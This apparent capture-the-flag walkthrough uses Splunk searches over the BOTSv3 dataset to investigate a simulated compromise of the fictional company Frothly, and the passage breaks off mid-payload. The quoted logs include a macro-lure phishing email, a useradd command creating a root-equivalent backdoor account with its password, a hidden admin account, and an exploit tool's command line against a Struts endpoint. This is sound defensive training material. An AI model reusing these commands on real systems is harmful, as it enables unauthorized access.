2018-08-20 09:57:17	104.207.83.63	bgist@froth.ly	stout.png	Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4
2018-08-20 09:57:33	104.207.83.63	bgist@froth.ly	BRUCE BIRTHDAY HAPPY HOUR PICS.lnk	Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4
2018-08-20 09:58:42	107.77.212.175	mkraeusen@froth.ly	Frothly_GABF_Deck-2018-MK.pptx	Microsoft Office PowerPoint 2014
2018-08-20 10:33:17	174.215.12.64	ghoppy@froth.ly	HomeBrewingGuide.pdf	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0
2018-08-20 13:05:36	104.238.59.42	pcerf@froth.ly	Beer styles.pptx	Microsoft Office PowerPoint 2014


```

*Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4*

What was the name of the macro-enabled attachment identified as malware?  

Use stream:smtp as the sourcetype and look for alerts about malicious attachments.

```
index="botsv3" sourcetype=stream:smtp *alert* "attach_filename{}"="Malware Alert Text.txt"

content: [ [-]
     DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=frothly.onmicrosoft.com; s=selector1-froth-ly;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=YcGsxdP2WhfXGtrrbp/3IYETQNWjs2Rwwj+0vwzoyz0=;
 b=GzdUcoNn8mFLyo4YktQWjpjkqDUio3FXVNL18RMeLpTn/9tpYimFE69yWUSkcVS35PQZ6KZsWn01jmLvJSK/nl+oRbNUEgduCcXEueYH5t9MuAh5JJ7h2Yzn9c2NbqsPiKDVyVxIw4SiERqIrm/3diJLx9rhSB9VdRcxWGJdUTA=
Received: from SmtpServer.Submit by DM6PR17MB2139 with Microsoft SMTP Server
 id 15.20.973.16; Mon, 15 Sep 2018 01:21:13 +0000
Received: from DM6PR17MB2186.namprd17.prod.outlook.com (20.176.92.28) by
 DM6PR17MB2139.namprd17.prod.outlook.com (20.176.92.17) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.20.973.16; Mon, 15 Sep 2018 01:21:13 +0000
Received: from DM6PR17MB2186.namprd17.prod.outlook.com
 ([fe80::d97d:3d05:b533:b293]) by DM6PR17MB2186.namprd17.prod.outlook.com
 ([fe80::d97d:3d05:b533:b293%3]) with mapi id 15.20.0952.022; Wed, 25 Jul 2018
 18:29:12 +0000
From: Bruce Gist <bgist@froth.ly>
To: Bud Stoll <bstoll@froth.ly>, Fyodor Malteskesko <fyodor@froth.ly>, Grace
 Hoppy <ghoppy@froth.ly>, Al Bungstein <abungstein@froth.ly>
Subject: Draft Financial Plan for Brewery FY2019
Thread-Topic: Draft Financial Plan for Brewery FY2019
Thread-Index: AQHUJEU3KuF/HO95c06KTJ7LcIWHXA==
Date: Mon, 15 Sep 2018 01:21:12 +0000
Message-ID:
 <34d01f54-b269-4592-9633-4098605e3933@DM6PR17MB2139.namprd17.prod.outlook.com>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
authentication-results: spf=none (sender IP is ) smtp.mailfrom=<>; 
x-originating-ip: [104.207.83.63]
x-ms-publictraffictype: Email

     x-microsoft-exchange-diagnostics:
 1;DM6PR17MB2139;6:4uZPjqSpLrsX8ncd223OWBBQNn9tQNvFU12HgjqqrDp9Fd/FgZfO6fFe8S+MK/wRSIJ2VEbfP4qQJhNfB/yES36ES4VIglfcQxRnqSk1QUiCXhtTllSE1gAzznM9h14R8xaJaZcEjHegDoLlOkQpFf3gMFc/KLCkTXc/ZXhSxO2BC5nZqNG8Cz8emWzGdOPdLZVYtOFdGSSHA0797UGRordpPsvj02Qm1ksKoUt5vu/qWPKN40ANzfuNLE30UONXBSz/8cgMmFIMDv5LaroCKyuRCOgyp4rF7pKkbAYD8Wa34NEIrkY4Z/wQR5ZPf/QybNURjKnavoC2OGM0okJUlvf0+T4jPTmJNKHiUXFIAdleYDoKrBRB8kVtUnUQC5s7xujCB6RzEuq1wq+5CcaWZbIL1clgOOP5uj9Pblwnv5Q7LS11Uq5Rd4bpXl2Tv+zCXi7lIPaKARlyKMMCHcNBQg==;7:7BalJaBWqDJ6zJQnNbzhVSYwUAo7c02hLCVWh6Ocupr8ZoXFXqEuaJixveRz3z0MHYCJyeEkXZ1/YOJI/8Ud+Kq2Xah1YVgnIQ6i8MGNrVEYkolSAKhgVJ2ssMFeuCSvfTTt4HATUrU/Efa1EmLi7XeA5qmR2fZvtZF9vDc9vqHNO1uyCviy83BsBA955Hjs1R8o9gnnzY0u53ZdzQfzdtQnHFI6Clhfb95v8MhrDk8PvBqaOaaUhQVu9G706uqw
x-ms-exchange-antispam-srfa-diagnostics: SOS;
x-ms-office365-filtering-correlation-id: 1d699f2e-610d-4782-ad54-08d5f25c84db
x-microsoft-antispam:
 BCL:0;PCL:0;RULEID:(7020095)(4652040)(8989117)(5600073)(711020)(2017052603328)(7153060)(49563074)(7193020);SRVR:DM6PR17MB2139;
x-ms-traffictypediagnostic: DM6PR17MB2139:|DM6PR17MB2139:|DM6PR17MB2139:
x-ms-exchange-parent-message-id:
 <DM6PR17MB218637EC7C30715CDB859BB3CD540@DM6PR17MB2186.namprd17.prod.outlook.com>
auto-submitted: auto-generated
x-ms-exchange-generated-message-source: DC Pre Content Filter Agent
x-ms-exchange-transport-rules-loop: 1
x-forefront-prvs: 0744CFB5E8
x-forefront-antispam-report:
 SFV:SPM;SFS:(10009020)(366004)(5060100009);DIR:OUT;SFP:1501;SCL:5;SRVR:DM6PR17MB2139;H:;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;
received-spf: None (protection.outlook.com:  does not designate permitted
 sender hosts)

     x-microsoft-antispam-message-info:
 4or7AwWT4fy4T8cyO6uNM6vx71ssA9cH9+PE7oFqNz8p/qTc1fa0gPIYTsRrKZL7StkkT3VK8GgEghg7NQAVhPDUCRC/d1GtVZpZTi1lhDkl4Ux2bd2pEqGR5uPg2NdazA4g0mN24uIjJGFZq7Q5Y9FxCP/Q4WHUE3WXOPY3dfIV73eGByNC+qbtwLaeAXANUbuDOrL5jSKWVEatTIEnDBPgmvAtj/CYnotnQIcxKTKi907o4SCnN9fpwDuUh4rTBTbnOZW6upzQ5T6SraMg/BD2gc1QO69POKVauZM3ciXrNyCt1dTM2KHzDsDRorxEwIxl+2AH5tQDfbHZDg72xyIRgdrc5ygnmtzQfoFfiDN2USoPFezwc9evum2xb/xt2vVr/n/LBUpqB//vOVFHPHvsE/x7UXCZm4ec/tQoXrEa79Q4Y6FuLptKeAEEI0Rl
spamdiagnosticoutput: 1:22
Content-Type: multipart/mixed;
	boundary="_002_34d01f54b269459296334098605e3933DM6PR17MB2139namprd17pr_"
MIME-Version: 1.0
X-OriginatorOrg: froth.ly
X-MS-Exchange-CrossTenant-Network-Message-Id: f6016145-365a-477d-708c-08d5f25c85b3
X-MS-Exchange-CrossTenant-originalarrivaltime: 15 Sep 2018 01:21:12.0508
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 225e05a1-5914-4688-a404-7030e60f3143
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM6PR17MB2139


     --_002_34d01f54b269459296334098605e3933DM6PR17MB2139namprd17pr_

     Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable


     Here is a financial model we can use for FY2019 planning.  For the workshee=
t to operate properly, you will need to enable macros.
Thanks,Bruce =

--_002_34d01f54b269459296334098605e3933DM6PR17MB2139namprd17pr_

     Content-Type: application/octet-stream; name="Malware Alert Text.txt"
Content-Description: Malware Alert Text.txt
Content-Disposition: attachment; filename="Malware Alert Text.txt"; size=197;
	creation-date="Mon, 15 Sep 2018 01:21:13 GMT";
	modification-date="Mon, 15 Sep 2018 01:21:13 GMT"
Content-Transfer-Encoding: base64

TWFsd2FyZSB3YXMgZGV0ZWN0ZWQgaW4gb25lIG9yIG1vcmUgYXR0YWNobWVudHMgaW5jbHVkZWQg
d2l0aCB0aGlzIGVtYWlsIG1lc3NhZ2UuIA0KQWN0aW9uOiBBbGwgYXR0YWNobWVudHMgaGF2ZSBi
ZWVuIHJlbW92ZWQuDQpGcm90aGx5LUJyZXdlcnktRmluYW5jaWFsLVBsYW5uaW5nLUZZMjAxOS1E
cmFmdC54bHNtCSBXOTdNLkVtcHN0YWdlDQo=

```


*Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm*

What is the name of the executable that was embedded in the malware? Answer guidance: Include the file extension. (Example: explorer.exe)  

Use XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the source type.

```
.xlsm is a file extension for an Excel Macro-Enabled Workbook file. It is a type of Microsoft Excel file that contains macros, which are scripts that automate tasks in the spreadsheet. These files are commonly used in businesses and organizations to automate repetitive tasks and improve efficiency. They can be opened and edited using Microsoft Excel or other spreadsheet software that supports macros.

index="botsv3" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" *xlsm*

file_create_time
	2018-08-20 09:55:52.449	
	
file_name
	Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm	
	
file_path
	C:\Users\BruceGist\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm	
	
object_category
	file (filesystem) 	
	
process
	HxTsr.exe
```


*HxTsr.exe*

What is the password for the user that was successfully created by the user "root" on the on-premises Linux system?  

Osquery is logging command executions on the Linux host hoth.

```
index="botsv3" (adduser OR useradd) sourcetype="osquery:results"


{ [-]
   action: added
   calendarTime: Mon Aug 20 11:24:54 2018 UTC
   columns: { [-]
     atime: 1534763224
     auid: 4294967295
     btime: 0
     cmdline: "useradd" "-ou" "tomcat7" "-p" "ilovedavidverve" "0" "-g" "0" "-M" "-N" "-r" "-s" "/bin/bash"
     ctime: 1533402436
     cwd:
     egid: 0
     euid: 0
     gid: 0
     mode: 0100755
     mtime: 1494977854
     owner_gid: 0
     owner_uid: 0
     parent:
     path: /usr/sbin/useradd
     pid: 12815
     status:
     time: 1534764286
     uid: 0
     uptime: 11143
   }
   counter: 0
   decorations: { [-]
     host_uuid: 1E194D56-34FC-06B8-0107-41BC8367251B
     username: root
   }
   epoch: 0
   hostIdentifier: hoth
   name: pack_process-monitoring_proc_events
   unixTime: 1534764294
}
Show as raw text

    host = hoth
    source = /var/log/osquery/osqueryd.results.log
    sourcetype = osquery:results

cmdline: "useradd" "-ou" "tomcat7" "-p" "ilovedavidverve" "0" "-g" "0" "-M" "-N" "-r" "-s" "/bin/bash"

This command creates a new user named "tomcat7" with a password of "ilovedavidverve", and assigns the user to the primary group with a GID of 0, and no supplementary groups. The new user's home directory will not be created and the user's shell is set to "/bin/bash". The "-M" flag specifies that the user's home directory will not be created, and the "-N" flag specifies that no group should be created with the name of the new user. The "-r" flag specifies that the user is a system user, and the "-s" flag sets the user's shell to "/bin/bash". It is important to note that the use of this command should be limited to system administrators as it can be used to create malicious users as well.

```


*ilovedavidverve*

What is the name of the user that was created after the endpoint was compromised?  

Use WinEventLog:Security as the source type.

```
Event code 4720 in Windows event logs refers to a user account being created. It is generated by the Security-Auditing event source in the Windows Security log, and provides information about the new user account, such as the account name and the name of the user or process that created it. This event code can be useful for monitoring for unauthorized account creation on a Windows system.

index="botsv3" source="WinEventLog:Security" EventCode=4720

08/19/2018 22:08:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4720
EventType=0
Type=Information
ComputerName=FYODOR-L.froth.ly
TaskCategory=User Account Management
OpCode=Info
RecordNumber=277561
Keywords=Audit Success
Message=A user account was created.

Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

New Account:
	Security ID:		FYODOR-L\svcvnc
	Account Name:		svcvnc
	Account Domain:		FYODOR-L

Attributes:
	SAM Account Name:	svcvnc
	Display Name:		<value not set>
	User Principal Name:	-
	Home Directory:		<value not set>
	Home Drive:		<value not set>
	Script Path:		<value not set>
	Profile Path:		<value not set>
	User Workstations:	<value not set>
	Password Last Set:	<never>
	Account Expires:		<never>
	Primary Group ID:	513
	Allowed To Delegate To:	-
	Old UAC Value:		0x0
	New UAC Value:		0x15
	User Account Control:	
		Account Disabled
		'Password Not Required' - Enabled
		'Normal Account' - Enabled
	User Parameters:	<value not set>
	SID History:		-
	Logon Hours:		All

Additional Information:
	Privileges		-
Collapse

    host = FYODOR-L
    source = WinEventLog:Security
    sourcetype = wineventlog


```

*svcvnc*

Based on the previous question, what groups was this user assigned to after the endpoint was compromised? Answer guidance: Comma separated without spaces, in alphabetical order.  

Use WinEventLog:Security as the source type.

```
index="botsv3" source="WinEventLog:Security" svcvnc

08/19/2018 22:08:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4732
EventType=0
Type=Information
ComputerName=FYODOR-L.froth.ly
TaskCategory=Security Group Management
OpCode=Info
RecordNumber=277584
Keywords=Audit Success
Message=A member was added to a security-enabled local group.

Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Member:
	Security ID:		FYODOR-L\svcvnc
	Account Name:		-

Group:
	Security ID:		BUILTIN\Administrators
	Group Name:		Administrators
	Group Domain:		Builtin

Additional Information:
	Privileges:	
	
08/19/2018 22:08:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4732
EventType=0
Type=Information
ComputerName=FYODOR-L.froth.ly
TaskCategory=Security Group Management
OpCode=Info
RecordNumber=277565
Keywords=Audit Success
Message=A member was added to a security-enabled local group.

Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Member:
	Security ID:		FYODOR-L\svcvnc
	Account Name:		-

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Additional Information:
	Privileges:	
```

*Administrators,User*

What is the process ID of the process listening on a "leet" port?  

Osquery is logging open ports found on the Linux host hoth.

```
index="botsv3" sourcetype="osquery:results" 1337 "columns.port"=1337

 { [-]
   action: added
   calendarTime: Mon Aug 20 11:55:34 2018 UTC
   columns: { [-]
     address: 0.0.0.0
     family: 2
     fd: 3
     net_namespace: 4026531957
     path:
     pid: 14356
     port: 1337
     protocol: 6
     socket: 254926
   }
   counter: 5
   decorations: { [-]
     host_uuid: 1E194D56-34FC-06B8-0107-41BC8367251B
     username: klagerfield
   }
   epoch: 0
   hostIdentifier: hoth
   name: pack_incident-response_listening_ports
   unixTime: 1534766134
} 
```


*14356*

What is the MD5 value of the file downloaded to Fyodor's endpoint system and used to scan Frothly's network?  

Sysmon provides hash values when processes are executed. Figure out what EventCode you need to look at for that.

```
index="botsv3" host="fyodor-l" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
| table app 
| reverse

C:\Windows\System32\RuntimeBroker.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\NETSTAT.EXE
C:\Windows\System32\findstr.exe
C:\Windows\System32\RuntimeBroker.exe
C:\Windows\System32\msfeedssync.exe
C:\Program Files\internet explorer\ielowutil.exe
C:\Windows\System32\RuntimeBroker.exe
C:\Windows\System32\RuntimeBroker.exe
C:\Windows\System32\NETSTAT.EXE
C:\Windows\System32\NETSTAT.EXE
C:\Windows\Temp\hdoor.exe



index="botsv3" host="fyodor-l" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1   app="C:\\Windows\\Temp\\hdoor.exe"

hashes
Selected

2 Values, 100% of events
Reports
Top values 	Top values by time 	Rare values
Events with this field
Values 	Count 	% 	 
586EF56F4D8963DD546163AC31C865D7 	1 	100% 	
99925199059EE049F7AEDA8904C2F5BDFBA86671FD7A5989BD60B72F26EF737C


```
![[Pasted image 20230128212409.png]]

*586EF56F4D8963DD546163AC31C865D7*


### More endpoint events

In this task, you're focused on events that have mostly occurred on the endpoint. 

The questions below are from the 300 series of the BOTSv3 dataset. 

**Question 1 & 2**

A lot of malicious activity has occurred on Fyodor's endpoint. You can start your search with his host. 

Downloads can involve various protocols: HTTP, TCP, FTP, etc. Depending on the protocol, you might need to add an operation, such as FTP & RETR. 

If you go this route, the suspected port should be noticeable in the **Available Fields**. 

There are a couple of different paths you can take for this question. 

**Question 3**

This one might take some work. You're provided with a starting point, **/tmp directory**. Don't forget the asterisks, `/tmp/*.*`.

Review the data returned; you'll need to exclude source types to help narrow down the search.  

Additionally, add a keyword to help shrink the returned results even further. 

There are a few suspect files. Two of them, in particular, are the correct answer.

**Question 4**

An email was sent to Grace Hoppy. Honestly, you have enough here to find this answer. :)

The question lies on what source type to include or exclude in your search query. 

**Question 5-6**

Tackling this one will require some work too. To point you in the right direction, PowerShell Logging & some decoding will help you with this one.

 Once you've found the events with the attacker payloads, you'll have enough to build a search query for question #6.

Answer the questions below

What port number did the adversary use to download their attack tools?

Use XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the source type.

```

index="botsv3" sourcetype="stream:http" http_method=GET 
|  rare dest_port

dest_port	
count	
percent
22	1	0.010093
3333	1	0.010093
8000	3	0.030279
8080	16	0.161486
80	

index="botsv3" sourcetype="stream:http" dest_port=3333

 bytes: 5542317
   bytes_in: 177
   bytes_out: 5542140
   dest_ip: 45.77.53.176
   dest_mac: 00:50:56:E3:C7:18
   dest_port: 3333
   endtime: 2018-08-20T10:47:16.891201Z
   flow_id: e8947e90-2f4b-48eb-93e8-f0099d8f8188
   http_comment: HTTP/1.1 200 OK
   http_content_length: 5782482
   http_content_type: image/png
   http_method: GET
   http_user_agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112
   protocol_stack: ip:tcp:http
   site: 45.77.53.176:3333
   src_ip: 192.168.70.186
   src_mac: 00:0C:29:55:51:1A
   src_port: 64104
   status: 200
   time_taken: 11149728
   timestamp: 2018-08-20T10:47:05.742156Z
   transport: tcp
   uri_path: /images/logos.png 
   
```


*3333*

Based on the information gathered for question 1, what file can be inferred to contain the attack tools? Answer guidance: Include the file extension.  

Use stream:http as the source type.

*logos.png*

During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files? Answer guidance: Comma separated without spaces, in alphabetical order, include the file extension where applicable.  

Osquery is performing FIM on certain directories on the Linux host hoth.

```bash
File Integrity Monitoring (FIM) is a security technique that helps to detect and prevent unauthorized changes to files and folders on a computer or network. It works by comparing the current state of files and folders to a known, trusted baseline, and alerting when changes are detected. This can be useful for detecting malware, unauthorized access, or other security threats. FIM can be implemented through software or hardware solutions, and can be used in conjunction with other security measures like antivirus, intrusion detection, and firewalls.

index="botsv3" earliest=0 /tmp/*.* sourcetype!=lsof NOT phpsessionclean sourcetype="osquery:results" name=pack_fim_file_events  
| table _time, action, columns.target_path
| dedup action, columns.target_path

2018-08-20 11:18:47	added	/tmp/cclBJ1WV.s
2018-08-20 11:18:47	added	/tmp/ccgZ61x9.o
2018-08-20 11:18:47	added	/tmp/cciXqfJn.res
2018-08-20 11:18:47	added	/tmp/ccKUWXvN.o
2018-08-20 11:18:47	added	/tmp/ccg3B1cz.c
2018-08-20 11:18:47	added	/tmp/ccWz6Q7f.le
2018-08-20 11:18:47	added	/tmp/cc5NuUO1.ld
2018-08-20 11:13:57	added	/tmp/colonel.c
2018-08-20 11:13:57	added	/tmp/definitelydontinvestigatethisfile.sh
2018-08-20 11:42:55	added	/tmp/blargh.tgz
2018-08-20 11:42:55	added	/tmp/suitecrm.sql
2018-08-20 11:28:26	added	/tmp/loot.txt

index=botsv3 earliest=0 colonel.c OR definitelydontinvestigatethisfile.sh OR loot.txt OR blargh.tgz OR suitecrm.sql | reverse

Process Command Line:	"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "echo 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